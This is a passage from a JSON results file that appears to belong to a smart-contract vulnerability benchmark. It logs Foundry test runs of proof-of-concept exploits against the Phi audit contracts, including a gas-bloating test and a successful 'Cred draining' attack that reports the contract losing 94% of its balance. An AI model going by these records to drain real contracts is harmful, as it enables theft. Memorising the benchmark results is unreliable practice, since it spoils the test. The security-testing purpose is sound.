[0x7c8999dC9a822c1f0Df42023113EDB4FDd543266]) [delegatecall]\n    â”‚   â”‚   â”‚   â””â”€ â†� [Return] 1\n    â”‚   â”‚   â””â”€ â†� [Return] 1\n    â”‚   â”œâ”€ [0] user2::receive{value: 10000000000000000}()\n    â”‚   â”‚   â””â”€ â†� [Stop]\n    â”‚   â”œâ”€ [27817] PhiRewards::depositBatch{value: 990000000000000000}([0x7c8999dC9a822c1f0Df42023113EDB4FDd543266], [990000000000000000 [9.9e17]], [0x00000000], \"deposit from curator rewards distributor\")\n    â”‚   â”‚   â”œâ”€ emit Deposit(from: CuratorRewardsDistributor: [0x03A6a84cD762D9707A21605b548aaaB891562aAb], to: owner: [0x7c8999dC9a822c1f0Df42023113EDB4FDd543266], reason: 0x00000000, amount: 990000000000000000 [9.9e17], comment: \"deposit from curator rewards distributor\")\n    â”‚   â”‚   â””â”€ â†� [Stop]\n    â”‚   â”œâ”€ emit RewardsDistributed(credId: 1, sender: user2: [0x537C8f3d3E18dF5517a58B3fB9D9143697996802], royaltyfee: 10000000000000000 [1e16], distributeAmount: 990000000000000000 [9.9e17], total: 1000000000000000000 [1e18])\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] console::log(\"distribute() gas: \", 31307882 [3.13e7]) [staticcall]\n    â”‚   â””â”€ â†� [Stop]\n    â”œâ”€ [0] VM::assertLt(31307882 [3.13e7], 5000000 [5e6], \"distribute() should not consume excessive gas\") [staticcall]\n    â”‚   â””â”€ â†� [Revert] distribute() should not consume excessive gas: 31307882 >= 5000000\n    â””â”€ â†� [Revert] distribute() should not consume excessive gas: 31307882 >= 5000000\n\nBacktrace:\n  at VM.assertLt\n  at CuratorRewardsDistributorTest.testBloatingBalances\n\nSuite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 23.53s (23.53s CPU time)\n\nRan 1 test suite in 23.87s (23.53s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)\n\nFailing tests:\nEncountered 1 failing test in test/CuratorRewardsDistributor.t.sol:CuratorRewardsDistributorTest\n[FAIL: distribute() should not consume excessive gas: 31307882 >= 5000000] testBloatingBalances() (gas: 1733141509)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n\nTip: Run `forge test --rerun` to retry only the 1 failed test\nTip: Run `forge test --debug --match-test <TEST_NAME>` to inspect one failing test in the debugger\n",
+        "test_name": "testBloatingBalances",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-03"
+      },
+      {
+        "command": "C:\\Users\\REDACTED\\foundry\\forge.EXE test --root C:\\Users\\REDACTED\\Downloads\\vlun-data-main\\vlun-data-main\\work\\wave1_runs\\reevmbench\\reevmbench__audits__2024-08-phi\\checkout --match-test testCredDraining -vvv",
+        "exit_code": 0,
+        "exploit_success": true,
+        "failed": false,
+        "passed": true,
+        "ran": true,
+        "rpc_indicated": false,
+        "stderr_tail": "",
+        "stdout_tail": "No files changed, compilation skipped\n\nRan 1 test for test/Cred.t.sol:TestCred\n[PASS] testCredDraining() (gas: 4274720)\nLogs:\n  Cred lost:  94 % of its balance\n  Attacker gained:  22 times his initial balance\n\nSuite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.99ms (3.83ms CPU time)\n\nRan 1 test suite in 7.12ms (5.99ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)\n",
+        "test_name": "testCredDraining",
+        "timed_out": false,
+        "tool_missing": false,
+        "vulnerability": "H-06"
+      }
+    ],
+    "verification_level": "L5"
+  }
 }
